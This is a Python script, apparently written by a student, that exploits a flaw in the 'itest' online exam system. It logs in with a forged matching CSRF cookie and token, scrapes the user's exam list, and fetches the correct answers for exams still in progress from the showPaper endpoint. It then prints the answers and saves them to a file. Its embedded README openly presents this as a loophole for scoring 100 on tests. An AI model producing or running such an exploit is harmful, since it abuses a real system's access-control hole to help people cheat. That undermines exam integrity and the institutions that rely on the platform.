# coding: utf-8
# author: Hanxven_Marvels 20200707
import requests
import json
from bs4 import BeautifulSoup
import os
import time

# 登录需要提交的内容
data = {
    'username': '',
    'password': '',
    'act': 'doLogin',
    'itestlogin': '1',
    '_rp': '',
    'inputvcode': '',
    'csrf': 'fakelogin', # csrf这里可以随便搞，只要和cookie里的相同即可.
}

# 当前网络下itest的主机位置
HOST = '172.16.64.208'

# 读取文件内的HOST设置（如果文件存在）
if os.path.exists('setting.json'):
    print('配置文件存在，将读取文件内的设置.')
    with open('setting.json', 'r', encoding='utf-8') as file:
        jsondata = file.readlines()
    jsondata = ''.join(jsondata)
    try:
        jsondata = json.loads(jsondata)
        HOST = jsondata['host']
    except:
        print('文件读取出现错误，将使用默认设置.')

# headers
headers = {
    'POST':'/itest/itest/login HTTP/1.1',
    'Host': HOST,
    'Connection': 'keep-alive',
    'Content-Length': '97',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.58',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'http://' + HOST,
    'Referer': 'http://' + HOST + '/itest/itest/login',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5',
    'Cookie': 'csrf=fakelogin;'
}

# 说明信息
README = '''
    软件使用步骤在此
    众所周知，当你考完试的时候，就可以查看答案了
    但是有大佬发现，不一定非得考完试才能查看答案
    只要你进入考试了，答案就可以查看了
    其他情况下答案是不允许查看的。
    利用这个漏洞，我们可以在开始考试时直接看到答案，从而勉强拿到100分
    '''
print(README)

# 该函数读取答案页面，提取其中的信息，并保存到字符串中返回
def show_answer(exam_id: str) -> str:
    result = '\n'
    url = 'http://' + HOST + '/itest/itest/biz/exam/papershow/showPaper?clsEpId=' + exam_id
    page = ss.get(url)
    bs = BeautifulSoup(page.text, 'lxml')
    a_tag = bs.find_all('div', style="clear:both;")
    cnt = 1
    for each in a_tag:
        t_tag = each.find_all(style="color:red;")
        for item in t_tag:
            if item:
                choice = str(item.string)
                result += f'题目: {cnt:2}, {choice}\n'
                cnt += 1
    result += '---------------------------------------\n'
    return result
    
# 建立一个session
ss = requests.session()

# 记录链接的变量
itesturl = 'http://' + HOST + '/itest/itest/login'
classurl = 'http://' + HOST + '/itest/itest/s/exam/clazz'

# 验证码地址
ckcodeurl = 'http://' + HOST + '/itest/comon/oo?username=' + data['username'] + '&t=' + str(int(time.time()) * 1000)

# 用户输入
usr = input('输入账号:')
pwd = input('输入密码:')
data['username'] = usr
data['password'] = pwd

# 获取信息
res = ss.post(itesturl, headers=headers, data=data)
resJ = json.loads(res.text)

# 多次输入错误密码时，需要提交验证码，将会将验证码下载
if resJ['code'] == 10:
    ckr = ss.get(ckcodeurl)
    print('需要输入验证码，已经保存到目录下:')  
    with open('ck.jpeg', 'wb') as f:
        f.write(ckr.content)
    os.system('start ck.jpeg')
    ckcode = input()
    data['inputvcode'] = ckcode
    res = ss.post(itesturl, headers=headers, data=data)
    resJ = json.loads(res.text)

if resJ['code'] == 9 or resJ['code'] == 10:
    print('用户名或密码或验证码错误. 程序退出.')
    os.system("pause")
    os._exit(0)

# 获取当前的测试列表
res_class = ss.get(classurl)

# 使用soup解析网页
bs = BeautifulSoup(res_class.text, 'lxml')

# 提取h2标签
lst = bs.find_all('h2')


print('当前任务: \n')

# 该列表记录着所有的作业列表以及可用状态
# 每行包含三个元素，分别是: id, 是否可以查看答案, 以及是否正在考试, 科目名
# 没错，考试可以多个同时进行
tasklist = []

# 编号
no = 0


# 对于每个考试，输出信息
for each in lst:
    par = each.parent
    dd = par.find_all('dd')
    a = par.find_all('a')
    astr = str(a[0].string)
    name = str(each.string)

    if astr == '查看答题':
        inf = '答案可查看'
        ctt = a[0]["data-clsexamid"]
        print(f'序号{no}, ID: {ctt}')
        tasklist.append([ctt, True, False, name])
    elif astr == '继续考试':
        inf = '正在考试, 现在可以查看答案!'
        ctt = str(a[0]["id"])[5:]
        print(f'序号{no}, ID: {ctt}')
        tasklist.append([ctt, True, True, name])
    else:
        inf = '不可查看答案'
        ctt = str(a[0]["id"])[5:]
        print(f'序号{no}, ID: {ctt}')
        tasklist.append([ctt, False, False, name])

    print(f'{name} [{inf}]')
    print(f'截止日期: {dd[1].string}')
    print('-------------------')
    no += 1

# 文件保存到记事本，使用utf-8编码
ans_file = open('答案.txt', 'w', encoding='utf-8')

# 输出换行
print('')

# 题目序号
exam_cnt = 0
for each in tasklist:
    if each[2]:
        print(f'*** 发现正在进行的考试 {each[3]} ID: {each[0]}, 答案如下: ***')
        exam_cnt += 1
        data = show_answer(each[0])
        ans_file.write(each[3])
        ans_file.write(data)
        print(data)
    else:
        continue

if exam_cnt == 0:
    print('没有正在进行的考试. 默认显示所有可查看单元.')
    for each in tasklist:
        if each[1] == True and each[2] == False:
            print(each[3])
            data = show_answer(each[0])
            ans_file.write(each[3])
            ans_file.write(data)
            print(data)

# 版权（笑）信息
ans_file.write('\n__Marvels_你好__\n')
ans_file.close()

print('以上内容已被保存到当前目录下"答案.txt"')
os.system('pause')


